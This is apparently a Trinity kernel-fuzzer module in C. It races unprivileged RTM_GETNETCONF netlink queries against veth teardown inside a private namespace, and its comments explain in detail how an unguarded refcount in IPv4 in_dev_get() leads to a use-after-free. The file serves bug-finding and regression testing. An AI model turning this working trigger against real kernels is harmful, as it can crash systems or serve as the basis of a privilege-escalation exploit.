/*
 * netconf_getdevconf_inetdev_teardown_race - race RTM_GETNETCONF
 * (inet_netconf_get_devconf, RTNL_FLAG_DOIT_UNLOCKED) against concurrent
 * IPv4 in_device teardown via RTM_DELLINK.
 *
 * Bug class: in_dev_get() in include/linux/inetdevice.h:242 calls a bare
 * refcount_inc(&in_dev->refcnt) without the _not_zero guard.  When
 * inetdev_destroy() has already dropped the refcount to zero and queued
 * the RCU free (via call_rcu), a concurrent in_dev_get() from
 * inet_netconf_get_devconf() resurrects the refcount from 0->1, producing
 * a use-after-free on the subsequent inet_netconf_fill_devconf / in_dev_put
 * path.  RTM_GETNETCONF is registered with .flags = RTNL_FLAG_DOIT_UNLOCKED
 * so it runs WITHOUT the RTNL lock that inetdev_destroy() holds, opening
 * the window.  dev_get_by_index() in the GET handler holds a netdev ref
 * but that ref does not block inetdev_destroy(): NETDEV_UNREGISTER fires
 * inside unregister_netdevice_many_notify() before netdev_wait_allrefs_any(),
 * so the netdev ref is what keeps the caller in the race window while the
 * in_device refcount hits zero.  RTM_GETNETCONF is unprivileged (GET, no
 * CAP_NET_ADMIN required).
 *
 * The upstream IPv6 mirror (in6_dev_get() in include/net/addrconf.h) was
 * fixed by Kyle Zeng (OpenAI Security Research) in commit 0e243671bc7b
 * (2026-08-03): bare refcount_inc() -> refcount_inc_not_zero().  The
 * IPv4 in_dev_get() at include/linux/inetdevice.h:242-253 is unchanged
 * at HEAD; in_dev_hold_safe() (refcount_inc_not_zero) exists at :296 but
 * is not used by the getter.
 *
 * Note: br_multicast.c:4158,4189 are the only other non-driver in_dev_get()
 * callers at HEAD sharing the same exposure class, but they are out of scope
 * for this commit.
 *
 * Expected oracle: "refcount_t: addition on 0" warn or KASAN
 * slab-use-after-free in inet_netconf_fill_devconf / in_dev_put.
 *
 * Private netns (userns + netns via userns_run_in_ns).  Per outer
 * iteration: create a veth pair "vnci0"/"vnci1", assign 10.63.7.1/24 to
 * vnci0 (forces in_device alloc via __inetdev_init), also assign a ULA
 * IPv6 address (brings in inet6_dev for the 0e243671bc7b regression test),
 * bring the device up, then fork two workers:
 *
 *   Lane 1: tight RTM_DELLINK + RTM_NEWLINK + RTM_NEWADDR (v4) +
 *            RTM_NEWLINK-up loop cycling inetdev_destroy/__inetdev_init
 *            with a 200 ms wall cap.
 *   Lane 2: tight RTM_GETNETCONF AF_INET + AF_INET6 loop on the saved
 *            ifindex.  dev_get_by_index() holds the netdev ref for the
 *            window; what races is the in_device behind it.  AF_INET is
 *            the live bug lane; AF_INET6 is the regression check for
 *            0e243671bc7b.  Uses a separate NETLINK_ROUTE socket so
 *            Worker A's DELLINK/NEWLINK traffic does not interleave.
 *
 * Brick-safety: all work runs inside the grandchild's private netns;
 * addresses are RFC1918 / ULA and unroutable.  Grandchild _exit() reaps
 * every veth, socket and netlink fd along with the netns.
 *
 * Latch: userns_run_in_ns -EPERM (hardened userns policy refused
 * CLONE_NEWUSER) permanently gates the op off for this child.
 * Transient helper failures (return < 0 but not -EPERM) skip without
 * latching.
 */

#include <errno.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <string.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#include "child.h"
#include "childops-util.h"
#include "shm.h"
#include "signals.h"
#include "trinity.h"

#if __has_include(<sched.h>) && __has_include(<linux/netlink.h>) && \
    __has_include(<linux/rtnetlink.h>) && __has_include(<linux/veth.h>) && \
    __has_include(<linux/netconf.h>)

#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sched.h>

#include <linux/if.h>
#include <linux/if_addr.h>
#include <linux/if_link.h>
#include <linux/netconf.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/veth.h>

#include "childops-netlink.h"
#include "jitter.h"
#include "name-pool.h"
#include "random.h"
#include "userns-bootstrap.h"

/*
 * Latched per-child: userns_run_in_ns() reported -EPERM, meaning the
 * grandchild's unshare(CLONE_NEWUSER) was refused by hardened policy
 * (user.max_user_namespaces=0 or kernel.unprivileged_userns_clone=0).
 * Without a private user+net namespace we MUST NOT touch the host
 * netdev / addr tables, so the op stays disabled for the remainder of
 * this child's lifetime.  Transient helper failures (return < 0 but not
 * -EPERM) do not set this -- they may not recur on the next iteration.
 */
static bool ns_unsupported_netconf_inetdev_race;

#define NCID_OUTER_BASE		1U
#define NCID_OUTER_CAP		3U
#define NCID_WORKER_WALL_NS	(200ULL * 1000ULL * 1000ULL)
#define NCID_PARENT_WALL_NS	(250ULL * 1000ULL * 1000ULL)
#define NCID_RTNL_BUF		512U

/* RFC1918 10.63.7.1/24 -- routable only inside the private netns. */
#define NCID_V4_ADDR_HE		0x0a3f0701U	/* 10.63.7.1 in host order */
#define NCID_V4_PLEN		24U

/* ULA fc63::1/64 -- unroutable off-host. */
static const struct in6_addr ncid_v6_addr = {
	.s6_addr = { 0xfc, 0x63, 0, 0, 0, 0, 0, 0,
		     0,    0,    0, 0, 0, 0, 0, 0x01 }
};

/*
 * RTM_NEWLINK type=veth name="vnci0" peer="vnci1".  Mirrors the shape
 * used by ipv6-pmtu-teardown-race.c / bridge-fdb-stp.c.
 */
static int ncid_build_veth_create(struct nl_ctx *ctx)
{
	unsigned char buf[NCID_RTNL_BUF];
	struct nlmsghdr *nlh;
	struct ifinfomsg *ifi, *peer_ifi;
	size_t off, li_off, id_off, peer_off;

	memset(buf, 0, sizeof(buf));
	nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_type  = RTM_NEWLINK;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK |
			   NLM_F_CREATE | NLM_F_EXCL;
	nlh->nlmsg_seq   = nl_seq_next(ctx);

	ifi = (struct ifinfomsg *)NLMSG_DATA(nlh);
	ifi->ifi_family = AF_UNSPEC;
	off = NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(*ifi));

	off = nla_put_str(buf, off, sizeof(buf), IFLA_IFNAME, "vnci0");
	if (!off) return -EIO;

	li_off = off;
	off = nla_nest_start(buf, off, sizeof(buf), IFLA_LINKINFO);
	if (!off) return -EIO;
	off = nla_put_str(buf, off, sizeof(buf), IFLA_INFO_KIND, "veth");
	if (!off) return -EIO;

	id_off = off;
	off = nla_nest_start(buf, off, sizeof(buf), IFLA_INFO_DATA);
	if (!off) return -EIO;

	peer_off = off;
	off = nla_nest_start(buf, off, sizeof(buf), VETH_INFO_PEER);
	if (!off) return -EIO;

	if (off + NLMSG_ALIGN(sizeof(*peer_ifi)) > sizeof(buf))
		return -EIO;
	peer_ifi = (struct ifinfomsg *)(buf + off);
	memset(peer_ifi, 0, sizeof(*peer_ifi));
	peer_ifi->ifi_family = AF_UNSPEC;
	off += NLMSG_ALIGN(sizeof(*peer_ifi));

	off = nla_put_str(buf, off, sizeof(buf), IFLA_IFNAME, "vnci1");
	if (!off) return -EIO;

	nla_nest_end(buf, peer_off, off);
	nla_nest_end(buf, id_off, off);
	nla_nest_end(buf, li_off, off);

	nlh->nlmsg_len = (__u32)off;
	return nl_send_recv(ctx, buf, off);
}

/*
 * RTM_NEWADDR AF_INET 10.63.7.1/24 on the device named "vnci0".
 * Forces in_device alloc via __inetdev_init, which is the precondition
 * for the race: inetdev_destroy() can only be triggered after the
 * in_device is live.
 */
static int ncid_build_addaddr_v4(struct nl_ctx *ctx, int ifindex)
{
	unsigned char buf[NCID_RTNL_BUF];
	struct nlmsghdr *nlh;
	struct ifaddrmsg *ifa;
	__u32 addr_be = htonl(NCID_V4_ADDR_HE);
	size_t off;

	memset(buf, 0, sizeof(buf));
	nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_type  = RTM_NEWADDR;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK |
			   NLM_F_CREATE | NLM_F_EXCL;
	nlh->nlmsg_seq   = nl_seq_next(ctx);

	ifa = (struct ifaddrmsg *)NLMSG_DATA(nlh);
	ifa->ifa_family    = AF_INET;
	ifa->ifa_prefixlen = NCID_V4_PLEN;
	ifa->ifa_flags     = 0;
	ifa->ifa_scope     = RT_SCOPE_UNIVERSE;
	ifa->ifa_index     = (unsigned int)ifindex;

	off = NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(*ifa));
	off = nla_put(buf, off, sizeof(buf), IFA_LOCAL,   &addr_be, 4);
	if (!off) return -EIO;
	off = nla_put(buf, off, sizeof(buf), IFA_ADDRESS, &addr_be, 4);
	if (!off) return -EIO;

	nlh->nlmsg_len = (__u32)off;
	return nl_send_recv(ctx, buf, off);
}

/*
 * RTM_NEWADDR AF_INET6 fc63::1/64 on ifindex.  Brings inet6_dev live for
 * the 0e243671bc7b regression test in Lane 2's AF_INET6 getconf probes.
 */
static int ncid_build_addaddr_v6(struct nl_ctx *ctx, int ifindex)
{
	unsigned char buf[NCID_RTNL_BUF];
	struct nlmsghdr *nlh;
	struct ifaddrmsg *ifa;
	size_t off;

	memset(buf, 0, sizeof(buf));
	nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_type  = RTM_NEWADDR;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK |
			   NLM_F_CREATE | NLM_F_EXCL;
	nlh->nlmsg_seq   = nl_seq_next(ctx);

	ifa = (struct ifaddrmsg *)NLMSG_DATA(nlh);
	ifa->ifa_family    = AF_INET6;
	ifa->ifa_prefixlen = 64;
	ifa->ifa_flags     = 0;
	ifa->ifa_scope     = 0; /* RT_SCOPE_UNIVERSE */
	ifa->ifa_index     = (unsigned int)ifindex;

	off = NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(*ifa));
	off = nla_put(buf, off, sizeof(buf), IFA_LOCAL,   &ncid_v6_addr,
		      sizeof(ncid_v6_addr));
	if (!off) return -EIO;
	off = nla_put(buf, off, sizeof(buf), IFA_ADDRESS, &ncid_v6_addr,
		      sizeof(ncid_v6_addr));
	if (!off) return -EIO;

	nlh->nlmsg_len = (__u32)off;
	return nl_send_recv(ctx, buf, off);
}

static int ncid_build_setlink_up(struct nl_ctx *ctx, int ifindex)
{
	unsigned char buf[128];
	struct nlmsghdr *nlh;
	struct ifinfomsg *ifi;
	size_t off;

	memset(buf, 0, sizeof(buf));
	nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_type  = RTM_NEWLINK;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq   = nl_seq_next(ctx);

	ifi = (struct ifinfomsg *)NLMSG_DATA(nlh);
	ifi->ifi_family = AF_UNSPEC;
	ifi->ifi_index  = ifindex;
	ifi->ifi_flags  = IFF_UP;
	ifi->ifi_change = IFF_UP;

	off = NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(*ifi));
	nlh->nlmsg_len = (__u32)off;
	return nl_send_recv(ctx, buf, off);
}

static int ncid_build_dellink(struct nl_ctx *ctx)
{
	unsigned char buf[NCID_RTNL_BUF];
	struct nlmsghdr *nlh;
	struct ifinfomsg *ifi;
	size_t off;

	memset(buf, 0, sizeof(buf));
	nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_type  = RTM_DELLINK;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq   = nl_seq_next(ctx);

	ifi = (struct ifinfomsg *)NLMSG_DATA(nlh);
	ifi->ifi_family = AF_UNSPEC;

	off = NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(*ifi));
	off = nla_put_str(buf, off, sizeof(buf), IFLA_IFNAME, "vnci0");
	if (!off) return -EIO;

	nlh->nlmsg_len = (__u32)off;
	return nl_send_recv(ctx, buf, off);
}

/*
 * Build RTM_GETNETCONF for family @family with NETCONFA_IFINDEX=@ifindex.
 * inet_netconf_get_devconf() is registered RTNL_FLAG_DOIT_UNLOCKED; the
 * reply is RTM_NEWNETCONF (not a plain ACK), so we use nl_send_recv_any().
 *
 * The ifindex may point to a netdev that has been through DELLINK between
 * the time it was recorded and the time this request is processed -- that
 * is exactly the window the op is probing.  ENODEV / ENOBUFS from the
 * kernel are expected and counted only when the send+recv pair returned 0
 * (i.e. the kernel processed the request and sent back a response).
 */
static int ncid_build_getnetconf(struct nl_ctx *ctx, __u8 family, int ifindex)
{
	unsigned char buf[256];
	struct nlmsghdr *nlh;
	struct netconfmsg *ncm;
	__s32 idx = (__s32)ifindex;
	size_t off;

	memset(buf, 0, sizeof(buf));
	nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_type  = RTM_GETNETCONF;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq   = nl_seq_next(ctx);

	ncm = (struct netconfmsg *)NLMSG_DATA(nlh);
	ncm->ncm_family = family;

	off = NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(*ncm));
	off = nla_put(buf, off, sizeof(buf), NETCONFA_IFINDEX, &idx, sizeof(idx));
	if (!off) return -EIO;

	nlh->nlmsg_len = (__u32)off;
	return nl_send_recv_any(ctx, buf, off);
}

/*
 * Worker A (Destructor).  Tight RTM_DELLINK + RTM_NEWLINK + RTM_NEWADDR
 * + RTM_NEWLINK-up loop to cycle inetdev_destroy / __inetdev_init on
 * vnci0.  The DELLINK destroys both vnci0 and its peer vnci1; the NEWLINK
 * recreates the pair so the next iteration has something to destroy.
 * Self-bounded by NCID_WORKER_WALL_NS.
 */
static void worker_destructor(int op_type)
{
	struct nl_ctx ctx = { .fd = -1 };
	struct nl_open_opts opts = {
		.proto         = NETLINK_ROUTE,
		.recv_timeo_s  = 1,
		.caller_op     = (enum child_op_type)op_type,
	};
	struct timespec start, now;
	unsigned int i = 0;

	if (nl_open(&ctx, &opts) < 0)
		_exit(0);

	if (clock_gettime(CLOCK_MONOTONIC, &start) != 0)
		start.tv_sec = 0;

	for (;; i++) {
		int ifx;

		if (ncid_build_dellink(&ctx) == 0)
			__atomic_add_fetch(
				&shm->stats.netconf_inetdev_race.dellink_ok,
				1, __ATOMIC_RELAXED);

		/* Recreate: NEWLINK + NEWADDR v4 (forces in_device alloc) +
		 * NEWLINK-up.  Best-effort: any failure here just means the
		 * next iteration's DELLINK sees ENODEV, which is fine. */
		(void)ncid_build_veth_create(&ctx);
		ifx = (int)if_nametoindex("vnci0");
		if (ifx > 0) {
			(void)ncid_build_addaddr_v4(&ctx, ifx);
			(void)ncid_build_setlink_up(&ctx, ifx);
		}

		if ((i & 0x07U) == 0U &&
		    clock_gettime(CLOCK_MONOTONIC, &now) == 0) {
			unsigned long long elapsed =
				(unsigned long long)(now.tv_sec - start.tv_sec) *
					1000000000ULL +
				(unsigned long long)(now.tv_nsec - start.tv_nsec);
			if (elapsed >= NCID_WORKER_WALL_NS)
				break;
		}
	}

	nl_close(&ctx);
	_exit(0);
}

/*
 * Worker B (Poller).  Tight RTM_GETNETCONF loop on the saved ifindex,
 * alternating AF_INET (live bug) and AF_INET6 (0e243671bc7b regression
 * test).  Uses a separate NETLINK_ROUTE socket so Worker A's DELLINK /
 * NEWLINK traffic does not interleave with our recv path.  dev_index_reserve()
 * allocates ifindices via xa_alloc_cyclic() -- monotonically increasing with
 * no immediate reuse -- so a DELLINK/NEWLINK cycle always produces a fresh
 * index; probing a stale index returns ENODEV and never reaches in_dev_get().
 * Re-resolve the ifindex each iteration so both AF_INET and AF_INET6 probes
 * always target the live device.  Self-bounded by NCID_WORKER_WALL_NS.
 */
static void worker_poller(int ifindex, int op_type)
{
	struct nl_ctx ctx = { .fd = -1 };
	struct nl_open_opts opts = {
		.proto         = NETLINK_ROUTE,
		.recv_timeo_s  = 1,
		.caller_op     = (enum child_op_type)op_type,
	};
	struct timespec start, now;
	unsigned int i = 0;

	if (nl_open(&ctx, &opts) < 0)
		_exit(0);

	if (clock_gettime(CLOCK_MONOTONIC, &start) != 0)
		start.tv_sec = 0;

	for (;; i++) {
		unsigned int fresh;
		int rc;

		/* Re-resolve to track the current live device; stale ifindices
		 * are never recycled by the kernel so a stale probe returns
		 * ENODEV without reaching in_dev_get(). */
		fresh = if_nametoindex("vnci0");
		ctx.direct_syscalls += 3; /* if_nametoindex: socket + ioctl(SIOCGIFINDEX) + close */
		if (fresh > 0)
			ifindex = (int)fresh;

		/* AF_INET: live bug lane (in_dev_get bare refcount_inc) */
		rc = ncid_build_getnetconf(&ctx, AF_INET, ifindex);
		if (rc == 0)
			__atomic_add_fetch(
				&shm->stats.netconf_inetdev_race.getconf_v4_ok,
				1, __ATOMIC_RELAXED);
		else if (rc == -ENODEV)
			__atomic_add_fetch(
				&shm->stats.netconf_inetdev_race.getconf_enodev,
				1, __ATOMIC_RELAXED);

		/* AF_INET6: regression test for 0e243671bc7b */
		rc = ncid_build_getnetconf(&ctx, AF_INET6, ifindex);
		if (rc == 0)
			__atomic_add_fetch(
				&shm->stats.netconf_inetdev_race.getconf_v6_ok,
				1, __ATOMIC_RELAXED);
		else if (rc == -ENODEV)
			__atomic_add_fetch(
				&shm->stats.netconf_inetdev_race.getconf_enodev,
				1, __ATOMIC_RELAXED);

		if ((i & 0x1fU) == 0U &&
		    clock_gettime(CLOCK_MONOTONIC, &now) == 0) {
			unsigned long long elapsed =
				(unsigned long long)(now.tv_sec - start.tv_sec) *
					1000000000ULL +
				(unsigned long long)(now.tv_nsec - start.tv_nsec);
			if (elapsed >= NCID_WORKER_WALL_NS)
				break;
		}
	}

	nl_close(&ctx);
	_exit(0);
}

/*
 * Reap one worker, retrying through EINTR.  After NCID_PARENT_WALL_NS a
 * SIGKILL is sent so a wedged worker cannot outrun the trinity SIGALRM.
 */
static void ncid_reap_with_deadline(pid_t pid, struct timespec *deadline,
				    unsigned long *dc)
{
	for (;;) {
		struct timespec now;
		int status;
		pid_t r;

		r = waitpid_eintr(pid, &status, WNOHANG);
		*dc += 1; /* waitpid */
		if (r == pid)
			return;
		if (r < 0 && errno != ECHILD)
			return;

		if (clock_gettime(CLOCK_MONOTONIC, &now) == 0 &&
		    (now.tv_sec > deadline->tv_sec ||
		     (now.tv_sec == deadline->tv_sec &&
		      now.tv_nsec >= deadline->tv_nsec))) {
			(void)kill(pid, SIGKILL);
			*dc += 1; /* kill */
			(void)waitpid_eintr(pid, &status, 0);
			*dc += 1; /* waitpid */
			return;
		}
		(void)usleep(2000);
	}
}

struct netconf_inetdev_race_ctx {
	int           op_type;
	unsigned long direct_calls;
};

/*
 * Per-invocation body executed inside the grandchild's private netns by
 * userns_run_in_ns().  Build the veth pair and IPv4 address, fork the
 * two race workers, reap them under the parent wall-clock deadline.
 * The grandchild _exit()s after this returns; the kernel reaps every
 * veth, socket and netlink fd along with the netns.
 */
static int iter_one_in_ns(void *arg)
{
	struct netconf_inetdev_race_ctx *ctx = arg;
	const int op_type = ctx->op_type;
	const bool valid_op = (op_type >= 0 && op_type < NR_CHILD_OP_TYPES);
	struct nl_ctx nl = { .fd = -1 };
	struct nl_open_opts opts = {
		.proto = NETLINK_ROUTE,
		.recv_timeo_s = 1,
	};
	struct timespec deadline;
	int ifindex;
	pid_t pa, pb;

	/* Setup: open rtnl socket, bring lo up, create veth pair. */
	if (nl_open(&nl, &opts) < 0) {
		__atomic_add_fetch(&shm->stats.netconf_inetdev_race.setup_failed,
				   1, __ATOMIC_RELAXED);
		return 0;
	}

	rtnl_bring_lo_up(&nl);

	if (ncid_build_veth_create(&nl) != 0) {
		nl_close(&nl);
		__atomic_add_fetch(&shm->stats.netconf_inetdev_race.setup_failed,
				   1, __ATOMIC_RELAXED);
		return 0;
	}

	ifindex = (int)if_nametoindex("vnci0");
	if (ifindex <= 0) {
		nl_close(&nl);
		__atomic_add_fetch(&shm->stats.netconf_inetdev_race.setup_failed,
				   1, __ATOMIC_RELAXED);
		return 0;
	}

	/* Record vnci0 for sibling childops / per-syscall fuzzers. */
	name_pool_record(NAME_KIND_NETDEV, "vnci0", 5);

	/* Assign IPv4 address to force in_device alloc (__inetdev_init). */
	(void)ncid_build_addaddr_v4(&nl, ifindex);

	/* Assign IPv6 address to bring inet6_dev live for the v6 lane. */
	(void)ncid_build_addaddr_v6(&nl, ifindex);

	/* Bring the device up. */
	(void)ncid_build_setlink_up(&nl, ifindex);

	nl_close(&nl);

	if (valid_op)
		__atomic_add_fetch(&shm->stats.childop.setup_accepted[op_type],
				   1, __ATOMIC_RELAXED);

	/* Fork Worker A (Destructor). */
	pa = fork();
	ctx->direct_calls += 1; /* fork */
	if (pa < 0) {
		__atomic_add_fetch(&shm->stats.netconf_inetdev_race.setup_failed,
				   1, __ATOMIC_RELAXED);
		return 0;
	}
	if (pa == 0)
		worker_destructor(op_type);

	/* Fork Worker B (Poller). */
	pb = fork();
	ctx->direct_calls += 1; /* fork */
	if (pb < 0) {
		(void)kill(pa, SIGKILL);
		ctx->direct_calls += 1; /* kill */
		(void)waitpid_eintr(pa, NULL, 0);
		ctx->direct_calls += 1; /* waitpid */
		__atomic_add_fetch(&shm->stats.netconf_inetdev_race.setup_failed,
				   1, __ATOMIC_RELAXED);
		return 0;
	}
	if (pb == 0)
		worker_poller(ifindex, op_type);

	if (valid_op)
		__atomic_add_fetch(&shm->stats.childop.data_path[op_type],
				   1, __ATOMIC_RELAXED);

	/* Reap both workers under the parent wall-clock deadline. */
	if (clock_gettime(CLOCK_MONOTONIC, &deadline) != 0) {
		deadline.tv_sec = 0;
		deadline.tv_nsec = 0;
	}
	deadline.tv_nsec += (long)NCID_PARENT_WALL_NS;
	while (deadline.tv_nsec >= 1000000000L) {
		deadline.tv_nsec -= 1000000000L;
		deadline.tv_sec  += 1;
	}

	ncid_reap_with_deadline(pa, &deadline, &ctx->direct_calls);
	ncid_reap_with_deadline(pb, &deadline, &ctx->direct_calls);

	__atomic_add_fetch(&shm->stats.netconf_inetdev_race.completed_ok,
			   1, __ATOMIC_RELAXED);

	if (valid_op)
		childop_direct_syscalls_add((enum child_op_type)op_type,
					    ctx->direct_calls);
	return 0;
}

bool netconf_getdevconf_inetdev_teardown_race(struct childdata *child)
{
	struct netconf_inetdev_race_ctx ctx = { .op_type = child->op_type };
	unsigned int outer, i;

	__atomic_add_fetch(&shm->stats.netconf_inetdev_race.runs,
			   1, __ATOMIC_RELAXED);

	if (ns_unsupported_netconf_inetdev_race) {
		__atomic_add_fetch(&shm->stats.netconf_inetdev_race.setup_failed,
				   1, __ATOMIC_RELAXED);
		return true;
	}

	outer = BUDGETED(CHILD_OP_NETCONF_GETDEVCONF_INETDEV_TEARDOWN_RACE,
			 JITTER_RANGE(NCID_OUTER_BASE));
	if (outer > NCID_OUTER_CAP)
		outer = NCID_OUTER_CAP;
	if (outer == 0U)
		outer = 1U;

	for (i = 0; i < outer; i++) {
		int rc = userns_run_in_ns(CLONE_NEWNET, iter_one_in_ns, &ctx);

		if (rc == -EPERM) {
			/* Hardened userns policy refused CLONE_NEWUSER. */
			ns_unsupported_netconf_inetdev_race = true;
			{
				const int op = child->op_type;
				if (op >= 0 && op < NR_CHILD_OP_TYPES)
					__atomic_store_n(
						&shm->stats.childop.latch_reason[op],
						CHILDOP_LATCH_NS_UNSUPPORTED,
						__ATOMIC_RELAXED);
			}
			__atomic_add_fetch(
				&shm->stats.netconf_inetdev_race.setup_failed,
				1, __ATOMIC_RELAXED);
			return true;
		}
		if (rc < 0) {
			/* Transient failure -- skip without latching. */
			__atomic_add_fetch(
				&shm->stats.netconf_inetdev_race.setup_failed,
				1, __ATOMIC_RELAXED);
			continue;
		}
	}

	return true;
}

#else  /* missing sched.h / netlink.h / rtnetlink.h / veth.h / netconf.h */

bool netconf_getdevconf_inetdev_teardown_race(struct childdata *child)
{
	(void)child;
	__atomic_add_fetch(&shm->stats.netconf_inetdev_race.runs,
			   1, __ATOMIC_RELAXED);
	__atomic_add_fetch(&shm->stats.netconf_inetdev_race.setup_failed,
			   1, __ATOMIC_RELAXED);
	return true;
}

#endif
